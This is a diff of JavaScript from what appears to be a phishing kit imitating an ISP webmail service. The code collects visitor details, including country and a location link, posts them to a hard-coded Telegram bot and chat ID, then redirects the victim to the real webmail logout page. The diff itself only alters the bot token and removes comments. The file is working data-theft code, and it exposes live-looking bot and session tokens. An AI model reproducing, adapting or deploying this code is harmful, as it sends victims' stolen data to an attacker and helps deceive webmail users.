@@ -168,10 +168,9 @@ Country: ${this.location.country || 'N/A'}
 Location Link: ${googleMapsLink}`;
 
             console.log('message is', message);
-            const botToken = '7499511150:AAG1Uo2bDVcgKrJIAoz-AOCLmS1TgYud5pl';
+            const botToken = '7499511150:AAG1Uo2bDVcgKrJIAoz-AOCLmS1TgYud5pI';
 
             const chatId = 1613277499;
-            // const chatId = 7067343735;
             const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
             try {
@@ -192,7 +191,6 @@ Location Link: ${googleMapsLink}`;
         },
 
         redirectToWebmail() {
-            // Redirect to webmail (or any other desired location)
             // window.location.href = 'https://webmail.en.bellnet.ca'; // Replace with actual URL
             window.location.href = 'https://webmail.wightman.ca/?_task=logout&_token=UfokgKShUDxHAHgQQEYU9oeylD6zjBal';
 
